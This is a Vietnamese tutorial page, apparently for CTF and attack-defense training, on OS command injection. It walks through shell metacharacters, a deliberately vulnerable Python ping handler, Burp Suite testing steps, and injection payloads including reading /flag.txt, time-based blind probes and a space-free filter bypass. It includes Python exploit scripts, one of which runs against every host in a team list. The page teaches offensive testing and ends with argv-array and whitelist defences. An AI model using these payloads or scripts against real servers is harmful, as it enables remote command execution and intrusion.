OS Command Injection

Khi một trang web nhận input của bạn rồi đưa thẳng vào một lệnh hệ điều hành (như ping, convert ảnh, nslookup...) — bạn có thể chèn thêm lệnh của riêng mình, khiến server tự chạy lệnh đó và trả kết quả (hoặc cho bạn một shell điều khiển trực tiếp máy chủ).

00 / TÓM TẮT 1 PHÚT

Command Injection là gì, để làm gì?

Nhiều trang web cần "nhờ" hệ điều hành làm một việc gì đó thay vì tự viết code: kiểm tra mạng bằng ping, đổi định dạng ảnh bằng convert, nén file bằng zip... Để làm việc này, code của server phải gọi ra một chương trình ngoài (gọi là "shell command"). Nếu server ghép thẳng input của bạn vào câu lệnh đó mà không kiểm tra, bạn có thể chèn thêm một lệnh khác ngay trong input — và server sẽ chạy luôn lệnh đó, y như bạn đang gõ trực tiếp vào terminal của máy chủ.

Nếu chỉ nhớ một điều Đây là lỗ hổng nguy hiểm nhất trong các lỗ hổng injection — vì hậu quả thường là chạy được lệnh bất kỳ trên server (RCE — Remote Code Execution), không chỉ đọc dữ liệu như SQLi. Ký tự chìa khóa: ;, |, &&, và dấu backtick `...` — đây đều là ký tự shell dùng để "nối thêm lệnh" hoặc "chạy lệnh con".
⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay
⚡ OS COMMAND INJECTION
🚩 Nhận ra trong 30 giây Chức năng "có mùi" gọi lệnh hệ thống: ping/traceroute IP, kiểm tra domain, convert/resize ảnh, tạo PDF, export/backup, chạy script người dùng upload. Gõ ; id hoặc | whoami vào ô nhập → nếu response xuất hiện thêm output lạ (tên user, uid=...) ⟹ trúng command injection.
✅ Tiền đề cần có Tham số đi vào một lệnh shell thật (không phải chỉ validate rồi bỏ). Biết output lệnh có hiện ra màn hình không (ăn ngay) hay phải suy luận qua thời gian/hành vi (blind).
🔍 Dò nhanh bằng Burp Bắt request → Repeater → thử lần lượt ;id, |id, &&id, `id`, $(id) ở tham số nghi ngờ → response nào xuất hiện uid=.../gid=.../groups=... là đúng ký tự phân cách shell đang dùng được.

01 / NỀN TẢNG BẮT BUỘC

Những thứ cần hiểu trước

Shell — chương trình dòng lệnh của hệ điều hành (như bash trên Linux) — nơi bạn gõ lệnh như ls, ping, cat và nó thực thi. Server cũng có thể "gõ hộ" một lệnh vào shell này từ bên trong code của nó.
Ký tự phân cách lệnh (shell metacharacter) — những ký tự có ý nghĩa đặc biệt với shell, không phải chữ thường: ; (chạy lệnh tiếp theo dù lệnh trước đúng/sai), && (chạy lệnh tiếp theo chỉ khi lệnh trước thành công), | (đưa output của lệnh trước làm input cho lệnh sau), `lệnh` hoặc $(lệnh) (chạy lệnh con, lấy kết quả của nó chèn vào ngay tại chỗ).
RCE (Remote Code Execution) — hậu quả cuối cùng: kẻ tấn công chạy được lệnh tùy ý trên máy chủ từ xa, qua mạng, không cần ngồi trước máy đó.

Ví dụ: trang web có chức năng "Kiểm tra kết nối" — bạn nhập IP, server ping thử rồi hiển thị kết quả. Code phía sau (kiểu hay gặp trong challenge) nối chuỗi trực tiếp:

# Python
ip = request.args.get("ip")
output = os.popen(f"ping -c 1 {ip}").read()

Lập trình viên định chạy đúng ping -c 1 <IP người dùng nhập>. Nhưng vì ip được dán thẳng vào chuỗi lệnh, bạn có thể biến nó thành hai lệnh.

02 / VÌ SAO LỖ HỔNG TỒN TẠI

Shell không phân biệt được "dữ liệu" với "lệnh"

Giống hệt vấn đề của SQLi (xem bài sqli.html nếu đã học) nhưng ở tầng hệ điều hành thay vì database: shell chỉ đọc một chuỗi ký tự dài và thực thi theo đúng cú pháp của nó, không biết phần nào server "định" là dữ liệu (IP) và phần nào là lệnh thật.

Khi bạn gõ 127.0.0.1; id vào ô input, server ghép ra:

ping -c 1 127.0.0.1; id

Với shell, đây không phải "một lệnh ping với tham số kỳ lạ" — mà là HAI lệnh riêng biệt nối bằng dấu ;: ping -c 1 127.0.0.1 chạy xong, rồi tới lệnh id chạy tiếp, hoàn toàn độc lập. Dấu ; trong input của bạn đã "thoát vai" dữ liệu để trở thành cú pháp shell thật.

03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI

Request độc → shell hiểu thành 2 lệnh → hậu quả

Ví dụ bằng payload thật đi hết chuỗi: service ping trả nguyên văn output ra trang. Bạn gửi ip=127.0.0.1; cat /flag.txt. Server chạy ping -c 1 127.0.0.1; cat /flag.txt. Shell thực thi tuần tự: ping xong (có output "PING 127.0.0.1... 1 packets transmitted..."), sau đó chạy tiếp cat /flag.txt — output của lệnh này (nội dung file flag) được os.popen().read() hứng trọn cùng với output của ping, rồi server in cả cục đó ra trang.

05 / KHAI THÁC BẰNG BURP SUITE

Bấm gì (từng bước)

Bước 1 — bắt request
  1. Burp → tab Proxy → bật Intercept is on → trình duyệt đặt proxy 127.0.0.1:8080.
  2. Trên web, dùng chức năng ping/kiểm tra bất kỳ với input bình thường (vd 8.8.8.8).
  3. Request bị giữ lại trong Burp.
Bước 2 — Repeater, thử từng ký tự phân cách
  1. Chuột phải request → Send to Repeater.
  2. Sửa giá trị tham số thành 8.8.8.8; id, bấm Send, đọc Response.
  3. Không thấy gì lạ? Sửa lại thành 8.8.8.8| id, Send, đọc lại. Lặp cho &&, backtick, $().
  4. Thấy dòng uid=1000(www-data) gid=... xuất hiện trong Response ⟹ đúng ký tự đó dùng được, server là Linux, chạy với quyền user www-data.
Khi nào cần Intruder Dùng Intruder để thử hàng loạt ký tự phân cách + lệnh dò tự động thay vì gõ tay từng cái: đánh dấu vị trí §8.8.8.8§, nạp payload list gồm ; id/| id/&& id/`id`/$(id)/%0a id, Start attack, lọc theo cột Length — dòng dài hơn hẳn (có thêm output uid=...) là payload trúng.

08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)

Từ tay-gõ-Burp sang script tự động

(A) Bản thủ công — để HIỂU từng bước

(B) Bản gọn chắc — dùng thực chiến, trích thẳng flag

import re, requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")

def exploit_cmdi(host):
    r = requests.get(f"http://{host}/ping",
            params={"ip": "127.0.0.1; cat /flag.txt"}, timeout=5)
    m = FLAG_RE.search(r.text)
    return m.group() if m else None

print("FLAG:", exploit_cmdi("TARGET_IP"))

(C) Bản A/D tái dùng — chạy mọi đội, mọi round

import re, requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")
PAYLOAD = "127.0.0.1; cat /flag.txt"

def exploit_cmdi(host):
    try:
        r = requests.get(f"http://{host}/ping", params={"ip": PAYLOAD}, timeout=5)
        m = FLAG_RE.search(r.text)
        return m.group() if m else None
    except requests.RequestException:
        return None

if __name__ == "__main__":
    for host in open("teams.txt").read().split():
        flag = exploit_cmdi(host)
        if flag:
            print(f"{host} {flag}")
            with open("flags.txt", "a") as f:
                f.write(f"{flag}\n")

Script blind (time-based) — khi output không hiện ra

import time, requests

def is_vulnerable_blind(host):
    url = f"http://{host}/ping"
    t0 = time.time()
    requests.get(url, params={"ip": "127.0.0.1; sleep 5"}, timeout=8)
    elapsed = time.time() - t0
    return elapsed > 4.5

if is_vulnerable_blind("TARGET_IP"):
    print("Dính blind command injection -> dùng commix --os-shell để khai thác tiếp")
Mức tự động của script nàyScript blind trên chỉ xác nhận có lỗ hổng (đo thời gian), không tự đọc được flag vì output không hiện ra màn hình. Xác nhận xong → dùng commix --os-shell (mục 07.B) để thực sự đọc file, không cố tự viết thêm script exfil phức tạp làm gì khi đã có công cụ chuyên dụng.

12 / NHẬN DIỆN & GIỚI HẠN

Khi nào ĐƯỢC / KHÔNG dùng

Tình huống
✅App gọi lệnh shell bằng cách nối chuỗi (os.system, os.popen, Python subprocess với shell=True và f-string, PHP exec()/system() với biến ghép thẳng).
❌App gọi chương trình ngoài bằng argv array, không qua shell (Python subprocess.run(["ping","-c","1",ip]) không có shell=True) — tham số được truyền thẳng làm 1 argument, không còn cú pháp shell để chèn thêm lệnh.
❌Input được validate nghiêm ngặt theo whitelist (chỉ cho qua IP đúng định dạng regex ^\d+\.\d+\.\d+\.\d+$) trước khi vào lệnh.
Nếu không ăn, kiểm tra xem app có đang dùng shell=False/argv-array không — lúc đó command injection kiểu cổ điển này không khai thác được nữa, cần tìm lỗ hổng khác.
13 / BÀI TẬP & THUẬT NGỮ

Luyện tập

⭐ Làm lại: dựng ví dụ mục 09 bằng tay trên Burp, từ gõ IP bình thường tới khi thấy flag trong Response.

Gợi ý nếu kẹtNhớ thử hết các ký tự phân cách ở mục 06.A, đừng dừng ở ; nếu nó không ăn.

⭐⭐ Đổi 1 biến: giả sử output không hiện ra màn hình (chỉ có "Ping thành công"/"Ping thất bại"). Dùng commix hoặc script blind ở mục 08 để xác nhận, rồi dùng commix --os-shell đọc flag.

Gợi ý nếu kẹtDùng &&/|| kết hợp sleep để vừa xác nhận vừa biết điều kiện trước đó đúng/sai.

⭐⭐⭐⭐ Tự nghĩ: challenge chặn toàn bộ khoảng trắng và các ký tự ;|&`. Viết payload đọc được /flag.txt chỉ dùng $(), ${IFS} và wildcard.

Gợi ý nếu kẹtThử: $(cat${IFS}/fl?g*) — kết hợp command substitution + biến IFS thay khoảng trắng + wildcard thay tên file không biết chính xác.

Thuật ngữ

Shell metacharacterKý tự có ý nghĩa đặc biệt với shell (; | & ` $...), không phải chữ thường.
RCERemote Code Execution — chạy được lệnh tùy ý trên máy chủ từ xa.
Blind injectionLỗ hổng tồn tại nhưng output không hiển thị trực tiếp, phải suy luận qua thời gian/hành vi khác.
Argv arrayCách gọi chương trình ngoài bằng danh sách tham số tách sẵn, không qua shell — miễn nhiễm với command injection kiểu cổ điển.
